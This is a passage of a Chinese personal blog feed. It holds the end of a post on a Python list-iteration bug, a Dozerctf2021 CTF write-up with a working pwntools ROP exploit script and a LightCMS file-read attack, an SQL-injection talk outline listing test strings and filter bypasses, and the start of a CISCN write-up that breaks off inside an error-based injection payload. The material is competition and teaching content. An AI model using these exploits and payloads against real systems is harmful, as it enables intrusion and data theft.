title="image-20210608170759998" loading="lazy"><p>移出后：</p><img src="/article/pythondict/image-20210608170807924.png" class="" title="image-20210608170807924" loading="lazy"><p>然后，它竟然跳出了for循环</p><img src="/article/pythondict/image-20210608171051661.png" class="" title="image-20210608171051661" loading="lazy"><p>也就是说<code>for user in data</code>已经走完一遍了</p><p>后面几次同理</p><h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>本人才疏学浅，略有拙见，如有错误还请大佬指正！</p><p>经过考虑，觉得原因如下</p><p>python的变量定义并没有那么严格，凭感觉说，像是一种容器。</p><p><code>for user in data</code>，其实就是user代表元素，而它内部有个隐形指针帮助user取元素，它删掉了元素后，迭代器未同步更新，迭代器最后到达list末尾不会报错，从而异常，我们做个小测试</p><pre class="language-python" data-language="python"><code class="language-python">dictlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> dictlist<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    dictlist<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>猜猜结果怎么样？</p><details>  <summary>结果如下</summary>{1: 1}{3: 3}{5: 5}{7: 7}</details><p>可见，只输出了单数位</p><p><code>for i in datalist</code>测试<code>datalist</code>里的值</p><p>第一次，即为 <code>datalist[0]</code>（这里不规范地用数组来表示，比较直观）</p><p>有值为{1: 1}，任务进行</p><p>结束后<code>dictlist.remove(i)</code></p><p>此时<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;3: 3&#125;, &#123;4: 4&#125;, &#123;5: 5&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p>第二次为<code>datalist[1]-&gt;&#123;3: 3&#125;</code></p><p>则可以认定，对于dict的remove是即时完成，而i是作为<code>in data</code>的指代，其内部的隐形指针是<code>for(int i=0;i&lt;data.length;i++)</code>的等价代换。(此处的表达并不规范，仅作示意参考)</p><p>当第四次时，<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p><code>datalist[3]-&gt;&#123;7: 7&#125;</code>，remove it.</p><p>第五次，<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;8: 8&#125;]</code></p><p><code>datalist[4]-&gt;NULL</code>跳出了循环</p><img src="/article/pythondict/image-20210608184852589.png" class="" title="image-20210608184852589" loading="lazy"><h5 id="问题缘由"><a href="#问题缘由" class="headerlink" title="问题缘由"></a>问题缘由</h5><p>写了个小脚本，准备按用户顺序处理任务，结果发现并没有按顺序执行，然后输出cycle后，发现按单数执行了第一遍，进一步深究。发现了这个情况。</p><hr><h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>那如果我直接pop出dict呢？</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>  user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="原思想：-1"><a href="#原思想：-1" class="headerlink" title="原思想："></a>原思想：</h4><p>既然for会有越界问题(似乎Python并不觉得这是个问题hhh)，那么如果换种方式呢。</p><p>每次直接pop出一个用户，然后执行任务，如果出错就把这个用户加回用户集</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span> </code></pre><p>这样一来，确实没啥问题</p><h4 id="实际情况：-1"><a href="#实际情况：-1" class="headerlink" title="实际情况："></a>实际情况：</h4><p>对于本测试，不需要考虑其他因素，而对于撸的那个脚本，一般是不会出错，如果出错应该是一段时间内出错，即无法立刻解决，需要等待（例如这个用户今天不需要执行这个任务，补救达到上限才会执行其他用户任务，会大大拖延脚本的运行速度），这时候如test1先执行其他用户任务即可。</p><p>但在实际脚本中，由于补错措施，程序不写好补错上限就会陷入死循环。</p><h4 id="原因：-1"><a href="#原因：-1" class="headerlink" title="原因："></a>原因：</h4><p>问题在于，pop会弹出用户集最后一个用户，而一旦出现错误，补错措施是将其append回用户集，即还是最后一个用户，这样就会造成死循环</p><p>这里不能用<code>data[&#39;xxx&#39;]=xxx</code>，因为实际dict有很多键值对</p><p>没啥好的根本解决方法，咱不是搞算法和开发的，没有深究这里面的方法，如有方法请师傅们指教。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后脚本还是test1的方式没有变了，既然Python迭代器没有对其做啥表示，咱也就这样用着就好啦</p><p>这是菜鸡摸鱼撸撸小脚本时候遇到的小情况，也算是一个学习记录吧，还没有系统性地学习Python，可能学到了就会有方法可以解决了吧…</p><hr><h2 id="2021-9-15更新"><a href="#2021-9-15更新" class="headerlink" title="2021.9.15更新"></a>2021.9.15更新</h2><p>和Python老师讨论了一下，<code>for i in data</code>的i其实是元素，用<code>type(i)</code>可以得知，能解释的就是还有隐形指针帮助i取元素，而这个隐形指针对i元素在data的表示有着绝对影响，所以在remove后迭代器未及时更新，导致最后到达了list末尾，迭代器正常工作，迭代器退出，程序结束，未报异常，但没有按照我们想让它执行的样子执行，这就是写代码的逻辑和实际运行逻辑的差异吧…</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dozerctf2021</title>
      <link href="article/dozerctf2021/"/>
      <url>article/dozerctf2021/</url>
      
        <content type="html"><![CDATA[<p>队伍名称：戈戈哥哥不鸽鸽</p><span id="more"></span><p>大师傅们都去打xctf了，几个比赛重时间了，春秋，美团，das。</p><p>在几个比赛中疯狂衔接2333</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="简单域渗透Ⅱ-1"><a href="#简单域渗透Ⅱ-1" class="headerlink" title="简单域渗透Ⅱ-1"></a>简单域渗透Ⅱ-1</h3><p>拿到题Lightcms，直接打。目前网上两个洞，一个v跨站脚本漏洞，一个后台RCE漏洞<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27112">CVE-2021-27112</a></p><p>dozer&#x2F;dozer123登陆后台</p><img src="/article/dozerctf2021/image-20210530221322010.png" class="" title="image-20210530221322010" loading="lazy"><p>在<code>内容管理-&gt;文章-&gt;新建文章内容</code>处上传文件，抓包得到<code>/admin/neditor/serve/uploadimage</code>路由，然后在<code>/admin/neditor/serve/catchImage</code>路由读取文件，网上有很多RCE文章，不多阐述。<code>file_get_contents</code>直接用file协议读取根目录flag，后来flag被改名了，这里算是前期的做法了。</p><img src="/article/dozerctf2021/image-20210530221927944.png" class="" title="image-20210530221927944" loading="lazy"><img src="/article/dozerctf2021/image-20210530221918897.png" class="" title="image-20210530221918897" loading="lazy"><p>后面即使拿到了shell也没有进一步突破，扫ip还扫错了</p><img src="/article/dozerctf2021/image-20210530230130511.png" class="" title="image-20210530230130511" loading="lazy"><hr><h3 id="未完成的网站"><a href="#未完成的网站" class="headerlink" title="未完成的网站"></a>未完成的网站</h3><p>猜测点</p><p><code>./people/&#123;&#125;</code>和<code>./download?url=&#123;&#125;</code></p><p>试了下发现过滤了<code>[]</code></p><p>然后疯狂被域渗透折磨</p><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h3><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5.30, 2021"""</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># p = process('./pwn')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'1.14.160.21'</span><span class="token punctuation">,</span><span class="token number">20001</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x000000000401281</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401313</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000401311</span>bin_addr <span class="token operator">=</span> <span class="token number">0x000000000401199</span>sh_addr <span class="token operator">=</span> <span class="token number">0x0000000004011F9</span>sys_addr <span class="token operator">=</span> <span class="token number">0x000000000401176</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xB16BAD</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xBADF00D</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xFEE1DEAD</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>cat /flag</code>即可</p><img src="/article/dozerctf2021/image-20210530225342181.png" class="" title="image-20210530225342181" loading="lazy"><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><img src="/article/dozerctf2021/image-20210530222649894.png" class="" title="image-20210530222649894" loading="lazy"><p>手比较快</p><hr><h3 id="做个问卷吧"><a href="#做个问卷吧" class="headerlink" title="做个问卷吧"></a>做个问卷吧</h3><p>非常简单</p><hr><h3 id="funny-pixel"><a href="#funny-pixel" class="headerlink" title="funny_pixel"></a>funny_pixel</h3><p>听说国赛有一个running_pixel?</p><p>那就类比一下，发现几张图片类似，看一下md5，发现一共只有6种md5。猜测是二进制，提出来前16章，二进制为</p><p><code>01000100</code>&#x3D;&#x3D;<code>d</code></p><p><code>01101111</code>&#x3D;&#x3D;<code>o</code></p><p>很明显思路正确，写脚本就行了</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 5月 30, 2021"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_file_md5</span><span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#创建md5对象</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fobj<span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> fobj<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">break</span>            m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token comment">#更新md5对象</span>    <span class="token keyword">return</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#返回md5对象</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    list0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'5baa9d8a0912ddfbd29ac3786ef859f8'</span><span class="token punctuation">,</span><span class="token string">'d63f8a4a7a1d6c8b8f04e7d73797edf8'</span><span class="token punctuation">,</span><span class="token string">'6002507730ab969502579b66e9fda4b9'</span><span class="token punctuation">]</span>    list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'86f2fd64a8d1f6bfa0728be9e97a4a72'</span><span class="token punctuation">,</span><span class="token string">'000b14c847091094ae2777614f16f4c6'</span><span class="token punctuation">,</span><span class="token string">'4d8a4db35c3a27b36865750319f7cdfd'</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        time <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> list0<span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"0"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">"1"</span>            time <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> time<span class="token operator">%</span><span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token string">" "</span>    result <span class="token operator">=</span> result<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">".png"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> pic_file<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pic <span class="token operator">=</span> get_file_md5<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        result<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>pic_file<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">".png"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> pic    result <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> item<span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span> <span class="token string">"w+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> result<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>                res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><img src="/article/dozerctf2021/image-20210530223305341.png" class="" title="image-20210530223305341" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入分享</title>
      <link href="article/sqlinjection/"/>
      <url>article/sqlinjection/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>小交流会的提纲，记录下，没有逻辑可言</p><p>今年本人参加的CTF中记录的sql题目，由于可能有多种解，这里列出本人解法仅供参考</p><table><thead><tr><th>比赛-题目名称</th><th>注入类型</th><th>详细情况</th></tr></thead><tbody><tr><td>MTCTF-sql</td><td>盲注</td><td>布尔型，同表查询</td></tr><tr><td>国赛CISCN-easy_sql</td><td>盲注，报错</td><td>sqlmap一把梭，布尔型&#x2F;延时注入&#x2F;报错注入，最后无列名注入</td></tr><tr><td>红帽杯-WebsiteManger</td><td>盲注</td><td>布尔型(异或)&#x2F;延时注入</td></tr><tr><td>红明谷-happysql</td><td>盲注</td><td>布尔型(正则)，无列名注入</td></tr><tr><td>DASCTF三月赛-bestDB</td><td>联合注入</td><td>load_file()</td></tr><tr><td>V&amp;NCTF-realezjvav</td><td>盲注</td><td>延时注入(笛卡尔积)</td></tr><tr><td>HGAME-200OK!</td><td>联合注入</td><td>基础SQL注入</td></tr><tr><td>HGAME-Liki-Jail</td><td>盲注</td><td>延时注入</td></tr><tr><td>春秋杯新春欢乐赛-按F注入</td><td>联合注入</td><td>Pgsql，延时注入(也许)&#x2F;信息外带&#x2F;数据库外联</td></tr></tbody></table><p>打个广告，各比赛的WP，有需要的师傅可以看看</p><p><a href="https://err0r.top/article/cqb2021/">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><p><a href="https://err0r.top/article/VN2021ctf/">V&amp;N2021公开赛</a></p><p><a href="https://err0r.top/article/mardasctf/">SQL无列名注入</a></p><p><a href="https://err0r.top/article/redhat2021/">红帽杯2021</a></p><p><a href="https://err0r.top/article/ciscn2021/">2021CISCN-WP</a></p><p>统计了一下今年的SQL注入题目，可能不全，从上表能看出大部分都是盲注，盲注的重要性可想而知。</p><hr><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol><li>version()——MySQL版本</li><li>user()——用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ol><p>最常用的一般是<code>database()</code>，有时候注意看<code>user()</code>，有些题目给的是root用户，需要用<code>load_file()</code>读文件，下面开始注入准备</p><hr><h2 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h2><table><thead><tr><th>测试字符串</th><th>变  种</th><th>预 期 结 果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’&#x3D;’1</td><td>1’) or (‘1’&#x3D;’1</td><td>永真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’&#x3D;’2</td><td>value’) or (‘1’&#x3D;’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’&#x3D;’2</td><td>1’) and (‘1’&#x3D;’2</td><td>永假条件。如果成功，将不返回表中任何行</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’+’b</td><td>1’) or (‘ab’&#x3D;’a’+’b</td><td>SQL Server字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’ ‘b</td><td>1’) or (‘ab’&#x3D;’a’ ‘b</td><td>MySQL字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’‖’b</td><td>1’) or (‘ab’&#x3D;’a’‖’b</td><td>Oracle字符串连接。如果成功，将返回与永真条件相同的信息</td></tr></tbody></table><hr><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注，就是指执行sql语句后返回值不直接回显到前端页面</p><hr><h2 id="过滤情况"><a href="#过滤情况" class="headerlink" title="过滤情况"></a>过滤情况</h2><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>比较劲爆，如果有回显可以报错注入查出简单信息</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><code>user()</code>&#x2F;<code>database()</code>&#x2F;<code>version()</code></p><ul><li>但这不行，可以利用堆叠注入绕过过滤</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token comment">#</span></code></pre><p>然后利用预编译方式查数据</p><p>经典题目：<a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a></p><ul><li><p>或者<code>alter</code>改表名，然后万能密码登陆出结果(如果可回显的话)</p></li><li><p>据说web端过滤也许可以preg_match回溯限制(有的情况)</p></li><li><p>同表的话可以同表查询</p><p>盲注字段名利用<code>left(column,0)</code></p><p>当存在字段时返回True</p></li></ul><p>基本过滤</p><table><thead><tr><th align="center">过滤</th><th align="center">替代方法</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">&amp;</td></tr><tr><td align="center">or</td><td align="center">|</td></tr><tr><td align="center">[空格]</td><td align="center">&#x2F;**&#x2F;或()或%0a</td></tr><tr><td align="center">#</td><td align="center">–+</td></tr><tr><td align="center">substr()</td><td align="center">mid()、substring()</td></tr><tr><td align="center">ascii()</td><td align="center">hex()、bin()、ord()</td></tr><tr><td align="center">sleep()</td><td align="center">benchmark()</td></tr><tr><td align="center">group_concat()</td><td align="center">concat_ws()</td></tr><tr><td align="center">&lt;、&gt;</td><td align="center">greatest()</td></tr><tr><td align="center">limit n,m</td><td align="center">limit m offset n</td></tr></tbody></table><table><thead><tr><th>测试字符串</th><th>变  种</th><th>预 期 结 果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’&#x3D;’1</td><td>1’) or (‘1’&#x3D;’1</td><td>永真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’&#x3D;’2</td><td>value’) or (‘1’&#x3D;’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’&#x3D;’2</td><td>1’) and (‘1’&#x3D;’2</td><td>永假条件。如果成功，将不返回表中任何行</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’+’b</td><td>1’) or (‘ab’&#x3D;’a’+’b</td><td>SQL Server字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’ ‘b</td><td>1’) or (‘ab’&#x3D;’a’ ‘b</td><td>MySQL字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’&#x3D;’a’‖’b</td><td>1’) or (‘ab’&#x3D;’a’‖’b</td><td>Oracle字符串连接。如果成功，将返回与永真条件相同的信息</td></tr></tbody></table><h2 id="移位溢注"><a href="#移位溢注" class="headerlink" title="移位溢注"></a>移位溢注</h2><p>知道表名不需要知道字段名，一般没用，能用的时候都能用其他的注出来。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021CISCN-WP</title>
      <link href="article/ciscn2021/"/>
      <url>article/ciscn2021/</url>
      
        <content type="html"><![CDATA[<p>Ciscn 2021</p><p>队伍名称：S3C_2021</p><span id="more"></span><h2 id="队伍情况"><a href="#队伍情况" class="headerlink" title="队伍情况"></a>队伍情况</h2><p><del>本菜鸡太菜，不值一提，希望分区赛能冲刺，争取进入总决赛(删了)</del></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>sql注入，sqlmap跑</p><img src="/article/ciscn2021/image-20210515121550955.png" class="" title="image-20210515121550955" loading="lazy"><p>根据log得知库名security</p><img src="/article/ciscn2021/image-20210515121644530.png" class="" title="image-20210515121644530" loading="lazy"><p>表名users，flag</p><img src="/article/ciscn2021/image-20210515121704337.png" class="" title="image-20210515121704337" loading="lazy"><p>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>EXTRACTVALUE<span class="token punctuation">(</span><span class="token number">4078</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x5c</span><span class="token punctuation">,</span><span class="token number">0x717a7a7671</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token keyword">join</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token keyword">no</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x717a6a7871</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 